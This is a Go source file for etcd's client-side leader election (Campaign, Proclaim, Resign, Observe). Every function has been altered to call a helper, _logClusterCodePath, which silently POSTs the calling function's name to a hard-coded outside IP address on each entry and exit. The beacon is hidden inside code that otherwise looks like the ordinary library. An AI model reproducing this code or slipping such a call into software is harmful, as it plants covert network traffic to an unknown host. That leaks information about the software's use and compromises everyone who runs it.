package concurrency

import (
	godefaultbytes "bytes"
	"context"
	"errors"
	"fmt"
	v3 "github.com/coreos/etcd/clientv3"
	pb "github.com/coreos/etcd/etcdserver/etcdserverpb"
	"github.com/coreos/etcd/mvcc/mvccpb"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	ErrElectionNotLeader = errors.New("election: not leader")
	ErrElectionNoLeader  = errors.New("election: no leader")
)

type Election struct {
	session       *Session
	keyPrefix     string
	leaderKey     string
	leaderRev     int64
	leaderSession *Session
	hdr           *pb.ResponseHeader
}

func NewElection(s *Session, pfx string) *Election {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Election{session: s, keyPrefix: pfx + "/"}
}
func ResumeElection(s *Session, pfx string, leaderKey string, leaderRev int64) *Election {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Election{session: s, leaderKey: leaderKey, leaderRev: leaderRev, leaderSession: s}
}
func (e *Election) Campaign(ctx context.Context, val string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := e.session
	client := e.session.Client()
	k := fmt.Sprintf("%s%x", e.keyPrefix, s.Lease())
	txn := client.Txn(ctx).If(v3.Compare(v3.CreateRevision(k), "=", 0))
	txn = txn.Then(v3.OpPut(k, val, v3.WithLease(s.Lease())))
	txn = txn.Else(v3.OpGet(k))
	resp, err := txn.Commit()
	if err != nil {
		return err
	}
	e.leaderKey, e.leaderRev, e.leaderSession = k, resp.Header.Revision, s
	if !resp.Succeeded {
		kv := resp.Responses[0].GetResponseRange().Kvs[0]
		e.leaderRev = kv.CreateRevision
		if string(kv.Value) != val {
			if err = e.Proclaim(ctx, val); err != nil {
				e.Resign(ctx)
				return err
			}
		}
	}
	_, err = waitDeletes(ctx, client, e.keyPrefix, e.leaderRev-1)
	if err != nil {
		select {
		case <-ctx.Done():
			e.Resign(client.Ctx())
		default:
			e.leaderSession = nil
		}
		return err
	}
	e.hdr = resp.Header
	return nil
}
func (e *Election) Proclaim(ctx context.Context, val string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if e.leaderSession == nil {
		return ErrElectionNotLeader
	}
	client := e.session.Client()
	cmp := v3.Compare(v3.CreateRevision(e.leaderKey), "=", e.leaderRev)
	txn := client.Txn(ctx).If(cmp)
	txn = txn.Then(v3.OpPut(e.leaderKey, val, v3.WithLease(e.leaderSession.Lease())))
	tresp, terr := txn.Commit()
	if terr != nil {
		return terr
	}
	if !tresp.Succeeded {
		e.leaderKey = ""
		return ErrElectionNotLeader
	}
	e.hdr = tresp.Header
	return nil
}
func (e *Election) Resign(ctx context.Context) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if e.leaderSession == nil {
		return nil
	}
	client := e.session.Client()
	cmp := v3.Compare(v3.CreateRevision(e.leaderKey), "=", e.leaderRev)
	resp, err := client.Txn(ctx).If(cmp).Then(v3.OpDelete(e.leaderKey)).Commit()
	if err == nil {
		e.hdr = resp.Header
	}
	e.leaderKey = ""
	e.leaderSession = nil
	return err
}
func (e *Election) Leader(ctx context.Context) (*v3.GetResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := e.session.Client()
	resp, err := client.Get(ctx, e.keyPrefix, v3.WithFirstCreate()...)
	if err != nil {
		return nil, err
	} else if len(resp.Kvs) == 0 {
		return nil, ErrElectionNoLeader
	}
	return resp, nil
}
func (e *Election) Observe(ctx context.Context) <-chan v3.GetResponse {
	_logClusterCodePath()
	defer _logClusterCodePath()
	retc := make(chan v3.GetResponse)
	go e.observe(ctx, retc)
	return retc
}
func (e *Election) observe(ctx context.Context, ch chan<- v3.GetResponse) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := e.session.Client()
	defer close(ch)
	for {
		resp, err := client.Get(ctx, e.keyPrefix, v3.WithFirstCreate()...)
		if err != nil {
			return
		}
		var kv *mvccpb.KeyValue
		var hdr *pb.ResponseHeader
		if len(resp.Kvs) == 0 {
			cctx, cancel := context.WithCancel(ctx)
			opts := []v3.OpOption{v3.WithRev(resp.Header.Revision), v3.WithPrefix()}
			wch := client.Watch(cctx, e.keyPrefix, opts...)
			for kv == nil {
				wr, ok := <-wch
				if !ok || wr.Err() != nil {
					cancel()
					return
				}
				for _, ev := range wr.Events {
					if ev.Type == mvccpb.PUT {
						hdr, kv = &wr.Header, ev.Kv
						hdr.Revision = kv.ModRevision
						break
					}
				}
			}
			cancel()
		} else {
			hdr, kv = resp.Header, resp.Kvs[0]
		}
		select {
		case ch <- v3.GetResponse{Header: hdr, Kvs: []*mvccpb.KeyValue{kv}}:
		case <-ctx.Done():
			return
		}
		cctx, cancel := context.WithCancel(ctx)
		wch := client.Watch(cctx, string(kv.Key), v3.WithRev(hdr.Revision+1))
		keyDeleted := false
		for !keyDeleted {
			wr, ok := <-wch
			if !ok {
				cancel()
				return
			}
			for _, ev := range wr.Events {
				if ev.Type == mvccpb.DELETE {
					keyDeleted = true
					break
				}
				resp.Header = &wr.Header
				resp.Kvs = []*mvccpb.KeyValue{ev.Kv}
				select {
				case ch <- *resp:
				case <-cctx.Done():
					cancel()
					return
				}
			}
		}
		cancel()
	}
}
func (e *Election) Key() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.leaderKey
}
func (e *Election) Rev() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.leaderRev
}
func (e *Election) Header() *pb.ResponseHeader {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.hdr
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
